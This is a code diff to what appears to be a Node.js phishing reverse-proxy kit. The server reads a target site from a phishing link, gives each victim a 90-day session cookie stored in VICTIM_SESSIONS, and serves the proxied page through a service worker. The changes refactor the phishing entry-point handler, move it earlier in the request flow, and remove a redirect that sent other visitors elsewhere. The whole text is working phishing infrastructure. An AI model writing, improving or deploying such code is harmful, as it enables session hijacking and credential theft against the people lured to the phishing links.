@@ -318,29 +318,26 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
     if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
         try {
             const phishedURL = new URL(decodeURIComponent(url.match(PHISHED_URL_REGEXP)[0]));
-            let session = currentSession;
-
-            if (!currentSession) {
-                const { cookieName, cookieValue } = generateNewSession(phishedURL);
-                clientResponse.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`);
-                session = cookieName;
-            }
-            VICTIM_SESSIONS[session].protocol = phishedURL.protocol;
-            VICTIM_SESSIONS[session].hostname = phishedURL.hostname;
-            VICTIM_SESSIONS[session].path = `${phishedURL.pathname}${phishedURL.search}`;
-            VICTIM_SESSIONS[session].port = phishedURL.port;
-            VICTIM_SESSIONS[session].host = phishedURL.host;
+            const { cookieName, cookieValue } = generateNewSession(phishedURL);
+            clientResponse.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`);
+            
+            VICTIM_SESSIONS[cookieName].protocol = phishedURL.protocol;
+            VICTIM_SESSIONS[cookieName].hostname = phishedURL.hostname;
+            VICTIM_SESSIONS[cookieName].path = `${phishedURL.pathname}${phishedURL.search}`;
+            VICTIM_SESSIONS[cookieName].port = phishedURL.port;
+            VICTIM_SESSIONS[cookieName].host = phishedURL.host;
 
             clientResponse.writeHead(200, { "Content-Type": "text/html" });
             fs.createReadStream(PROXY_FILES.index).pipe(clientResponse);
+            return;
         }
         catch (error) {
             displayError("Phishing URL parsing failed", error, url);
             clientResponse.writeHead(404, { "Content-Type": "text/html" });
             fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
+            return;
         }
     }
-
     else if (currentSession || url === PROXY_PATHNAMES.proxy) {
         if (url === PROXY_PATHNAMES.serviceWorker) {
             clientResponse.writeHead(200, { "Content-Type": "text/javascript" });
@@ -575,30 +572,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
         }
     }
 
-    if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
-        try {
-            const phishedURL = new URL(decodeURIComponent(url.match(PHISHED_URL_REGEXP)[0]));
-            const { cookieName, cookieValue } = generateNewSession(phishedURL);
-            clientResponse.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`);
-            
-            VICTIM_SESSIONS[cookieName].protocol = phishedURL.protocol;
-            VICTIM_SESSIONS[cookieName].hostname = phishedURL.hostname;
-            VICTIM_SESSIONS[cookieName].path = `${phishedURL.pathname}${phishedURL.search}`;
-            VICTIM_SESSIONS[cookieName].port = phishedURL.port;
-            VICTIM_SESSIONS[cookieName].host = phishedURL.host;
 
-            clientResponse.writeHead(200, { "Content-Type": "text/html" });
-            fs.createReadStream(PROXY_FILES.index).pipe(clientResponse);
-        }
-        catch (error) {
-            displayError("Phishing URL parsing failed", error, url);
-            clientResponse.writeHead(404, { "Content-Type": "text/html" });
-            fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
-        }
-    } else {
-        clientResponse.writeHead(301, { Location: REDIRECT_URL });
-        clientResponse.end();
-    }
 });
 
 proxyServer.listen(process.env.PORT ?? 3000);
